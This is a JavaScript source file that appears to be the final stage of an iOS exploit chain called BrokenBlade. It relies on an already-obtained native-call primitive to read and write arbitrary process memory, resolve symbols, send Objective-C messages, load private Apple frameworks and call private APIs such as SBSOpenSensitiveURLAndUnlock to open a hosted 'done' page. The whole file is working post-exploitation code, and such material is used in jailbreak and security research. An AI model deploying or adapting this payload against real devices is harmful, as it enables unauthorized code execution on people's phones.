(() => {
  const DONE_URL = globalThis.__bb_done_url || "https://zeroxjf.github.io/BrokenBlade/done.html";

  class Native {
    static #baseAddr;
    static #dlsymAddr;
    static #memcpyAddr;
    static #mallocAddr;
    static mem = 0n;
    static memSize = 0x4000;
    static #argMem = 0n;
    static #argPtr = 0n;
    static #dlsymCache = {};

    static init() {
      const buff = new BigUint64Array(nativeCallBuff);
      this.#baseAddr = buff[20];
      this.#dlsymAddr = buff[21];
      this.#memcpyAddr = buff[22];
      this.#mallocAddr = buff[23];
      this.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));
      this.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
      this.#argPtr = this.#argMem;
    }

    static write(ptr, buff) {
      if (!ptr) return false;
      const buff8 = new Uint8Array(nativeCallBuff);
      let offs = 0;
      let left = buff.byteLength;
      while (left) {
        let len = left > 0x1000 ? 0x1000 : left;
        buff8.set(new Uint8Array(buff, offs, len), 0x1000);
        this.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));
        left -= len;
        offs += len;
      }
      return true;
    }

    static read(ptr, length) {
      const buff = new ArrayBuffer(length);
      const buff8 = new Uint8Array(buff);
      let offs = 0;
      let left = length;
      while (left) {
        let len = left > 0x1000 ? 0x1000 : left;
        this.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));
        buff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);
        left -= len;
        offs += len;
      }
      return buff;
    }

    static writeString(ptr, str) {
      this.write(ptr, this.stringToBytes(str, true));
    }

    static stringToBytes(str, nullTerminated = false) {
      const buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
      const s8 = new Uint8Array(buff);
      for (let i = 0; i < str.length; i++) s8[i] = str.charCodeAt(i) & 0xff;
      if (nullTerminated) s8[str.length] = 0;
      return buff;
    }

    static bridgeInfo() {
      const buff = new BigUint64Array(nativeCallBuff);
      return { jsContextObj: buff[33] };
    }

    static #toNative(value) {
      if (!value) return 0n;
      if (typeof value === "string") {
        const ptr = this.#argPtr;
        this.writeString(ptr, value);
        this.#argPtr += BigInt(value.length + 1);
        return ptr;
      }
      if (typeof value === "bigint") return value;
      return BigInt(value);
    }

    static #dlsym(name) {
      if (!name) return 0n;
      let addr = this.#dlsymCache[name];
      if (addr) return addr;
      const RTLD_DEFAULT = 0xfffffffffffffffen;
      const nameBytes = this.stringToBytes(name, true);
      new Uint8Array(nativeCallBuff).set(new Uint8Array(nameBytes), 0x1000);
      addr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);
      if (addr) this.#dlsymCache[name] = addr;
      return addr;
    }

    static #nativeCallAddr(addr, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
      const buff = new BigInt64Array(nativeCallBuff);
      buff[0] = addr;
      buff[100] = x0;
      buff[101] = x1;
      buff[102] = x2;
      buff[103] = x3;
      buff[104] = x4;
      buff[105] = x5;
      buff[106] = x6;
      buff[107] = x7;
      invoker();
      return buff[200];
    }

    static callAddress(addr, x0, x1, x2, x3, x4, x5, x6, x7) {
      this.#argPtr = this.#argMem;
      x0 = this.#toNative(x0);
      x1 = this.#toNative(x1);
      x2 = this.#toNative(x2);
      x3 = this.#toNative(x3);
      x4 = this.#toNative(x4);
      x5 = this.#toNative(x5);
      x6 = this.#toNative(x6);
      x7 = this.#toNative(x7);
      const ret64 = this.#nativeCallAddr(BigInt(addr || 0n), x0, x1, x2, x3, x4, x5, x6, x7);
      this.#argPtr = this.#argMem;
      if (ret64 === 0xffffffffffffffffn) return -1;
      if (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);
      return ret64;
    }

    static callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {
      this.#argPtr = this.#argMem;
      x0 = this.#toNative(x0);
      x1 = this.#toNative(x1);
      x2 = this.#toNative(x2);
      x3 = this.#toNative(x3);
      x4 = this.#toNative(x4);
      x5 = this.#toNative(x5);
      x6 = this.#toNative(x6);
      x7 = this.#toNative(x7);
      const funcAddr = this.#dlsym(name);
      if (!funcAddr) {
        this.#argPtr = this.#argMem;
        return 0n;
      }
      const ret64 = this.#nativeCallAddr(funcAddr, x0, x1, x2, x3, x4, x5, x6, x7);
      this.#argPtr = this.#argMem;
      if (ret64 === 0xffffffffffffffffn) return -1;
      if (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);
      return ret64;
    }
  }

  function isNonZero(v) {
    return BigInt.asUintN(64, BigInt(v || 0n)) !== 0n;
  }

  function sel(name) {
    return Native.callSymbol("sel_registerName", name);
  }

  function objc(obj, selectorName, ...args) {
    return Native.callSymbol("objc_msgSend", obj, sel(selectorName), ...args);
  }

  function cfstr(str) {
    return Native.callSymbol("CFStringCreateWithCString", 0n, str, 0x08000100);
  }

  function log(msg) {
    try {
      const tagged = "[DONE-LAUNCH] " + msg;
      const ptr = Native.callSymbol("malloc", BigInt(tagged.length + 1));
      if (!ptr) return;
      Native.writeString(ptr, tagged);
      Native.callSymbol("syslog", 5, ptr);
      Native.callSymbol("free", ptr);
    } catch (_) {}
  }

  function emptyOptions() {
    const NSDictionary = Native.callSymbol("objc_getClass", "NSDictionary");
    return isNonZero(NSDictionary) ? objc(NSDictionary, "dictionary") : 0n;
  }

  function makeURL() {
    const NSURL = Native.callSymbol("objc_getClass", "NSURL");
    if (!isNonZero(NSURL)) {
      log("missing NSURL");
      return 0n;
    }
    const urlString = cfstr(DONE_URL);
    const url = isNonZero(urlString) ? objc(NSURL, "URLWithString:", urlString) : 0n;
    if (isNonZero(urlString)) Native.callSymbol("CFRelease", urlString);
    if (!isNonZero(url)) log("URLWithString failed url=" + DONE_URL);
    return url;
  }

  function selectorSupported(obj, selectorName) {
    if (!isNonZero(obj)) return false;
    return Number(objc(obj, "respondsToSelector:", sel(selectorName))) !== 0;
  }

  function trySBS(url) {
    try {
      const RTLD_DEFAULT = 0xfffffffffffffffen;
      const handle = Native.callSymbol("dlopen", "/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", 1);
      let openFn = isNonZero(handle) ? Native.callSymbol("dlsym", handle, "SBSOpenSensitiveURLAndUnlock") : 0n;
      if (!isNonZero(openFn)) openFn = Native.callSymbol("dlsym", RTLD_DEFAULT, "SBSOpenSensitiveURLAndUnlock");
      if (!isNonZero(openFn)) {
        log("SBSOpenSensitiveURLAndUnlock unavailable handle=" + handle);
        return false;
      }
      const ret = Native.callAddress(openFn, url, 1n);
      log("SBSOpenSensitiveURLAndUnlock called ret=" + ret + " handle=" + handle);
      return true;
    } catch (e) {
      log("SBS exception " + String(e));
      return false;
    }
  }

  function tryUIApplication(url) {
    try {
      const UIApplication = Native.callSymbol("objc_getClass", "UIApplication");
      if (!isNonZero(UIApplication)) {
        log("missing UIApplication");
        return false;
      }
      const app = objc(UIApplication, "sharedApplication");
      if (!isNonZero(app)) {
        log("missing sharedApplication");
        return false;
      }
      let attempted = false;
      if (selectorSupported(app, "canOpenURL:")) {
        const canOpen = objc(app, "canOpenURL:", url);
        log("UIApplication canOpenURL=" + canOpen);
      }
      if (selectorSupported(app, "openURL:options:completionHandler:")) {
        const options = emptyOptions();
        objc(app, "openURL:options:completionHandler:", url, options, 0n);
        log("UIApplication openURL:options:completionHandler: called options=" + options);
        attempted = true;
      }
      if (selectorSupported(app, "openURL:")) {
        objc(app, "openURL:", url);
        log("UIApplication openURL: called");
        attempted = true;
      }
      if (!attempted) log("UIApplication has no usable openURL selector");
      return attempted;
    } catch (e) {
      log("UIApplication exception " + String(e));
      return false;
    }
  }

  function tryLSWorkspace(url) {
    try {
      Native.callSymbol("dlopen", "/System/Library/Frameworks/CoreServices.framework/CoreServices", 1);
      Native.callSymbol("dlopen", "/System/Library/PrivateFrameworks/MobileCoreServices.framework/MobileCoreServices", 1);
      const LSApplicationWorkspace = Native.callSymbol("objc_getClass", "LSApplicationWorkspace");
      if (!isNonZero(LSApplicationWorkspace)) {
        log("missing LSApplicationWorkspace");
        return false;
      }
      const workspace = objc(LSApplicationWorkspace, "defaultWorkspace");
      if (!isNonZero(workspace)) {
        log("missing defaultWorkspace");
        return false;
      }
      const options = emptyOptions();
      if (selectorSupported(workspace, "openSensitiveURL:withOptions:")) {
        const ret = objc(workspace, "openSensitiveURL:withOptions:", url, options);
        log("LSApplicationWorkspace openSensitiveURL ret=" + ret + " options=" + options);
        return true;
      }
      if (selectorSupported(workspace, "openURL:withOptions:")) {
        const ret = objc(workspace, "openURL:withOptions:", url, options);
        log("LSApplicationWorkspace openURL:withOptions ret=" + ret + " options=" + options);
        return true;
      }
      if (selectorSupported(workspace, "openURL:")) {
        const ret = objc(workspace, "openURL:", url);
        log("LSApplicationWorkspace openURL ret=" + ret);
        return true;
      }
      log("LSApplicationWorkspace has no usable open selector");
      return false;
    } catch (e) {
      log("LSApplicationWorkspace exception " + String(e));
      return false;
    }
  }

  function openDoneUrl() {
    const url = makeURL();
    if (!isNonZero(url)) return false;
    const sbsOk = trySBS(url);
    const uiOk = tryUIApplication(url);
    const lsOk = tryLSWorkspace(url);
    log("open attempts done sbs=" + sbsOk + " ui=" + uiOk + " ls=" + lsOk + " url=" + DONE_URL);
    return sbsOk || uiOk || lsOk;
  }

  function runOnMain() {
    const jsctxObj = Native.bridgeInfo().jsContextObj;
    if (!isNonZero(jsctxObj)) return openDoneUrl();
    const script = "try{__bb_done_launcher_open();}catch(e){try{__bb_done_launcher_log('main error '+e);}catch(_){}}";
    const scriptRef = cfstr(script);
    if (!isNonZero(scriptRef)) return false;
    try {
      objc(jsctxObj, "performSelectorOnMainThread:withObject:waitUntilDone:", sel("evaluateScript:"), scriptRef, 1n);
      return true;
    } finally {
      Native.callSymbol("CFRelease", scriptRef);
    }
  }

  try {
    Native.init();
    globalThis.__bb_done_launcher_open = openDoneUrl;
    globalThis.__bb_done_launcher_log = log;
    log("entry url=" + DONE_URL);
    runOnMain();
  } catch (e) {
    try { log("fatal " + String(e)); } catch (_) {}
  }
})();
